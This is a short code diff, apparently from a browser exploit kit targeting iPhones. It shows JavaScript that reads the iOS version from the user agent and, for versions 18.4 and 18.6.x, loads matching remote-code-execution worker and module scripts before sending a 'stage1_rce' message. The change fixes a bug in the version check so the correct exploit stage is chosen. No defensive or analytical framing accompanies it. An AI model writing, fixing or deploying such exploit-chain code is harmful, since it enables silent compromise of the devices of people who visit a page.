@@ -73,7 +73,9 @@ let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
     }
 })();
 let workerCode = "";
-if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+// ios_version is an array like [18, 6] or [18, 6, 1]
+let version_str = ios_version ? ios_version.join(',') : '';
+if(version_str == '18,6' || version_str == '18,6,1' || version_str == '18,6,2')
     workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
 else
     workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`); // local version
@@ -169,7 +171,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         try
         {
         let rceCode = "";
-        if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+        if(version_str == '18,6' || version_str == '18,6,1' || version_str == '18,6,2')
                 rceCode = getJS(`rce_module_18.6.js?${Date.now()}`); // local version
             else
                 rceCode = getJS(`rce_module.js?${Date.now()}`); // local version
@@ -183,7 +185,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         }
         let desiredHost = "";
         desiredHost = localHost;
-            if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+            if(version_str == '18,6' || version_str == '18,6,1' || version_str == '18,6,2')
             {
                 worker.postMessage({
                     type: 'stage1_rce',
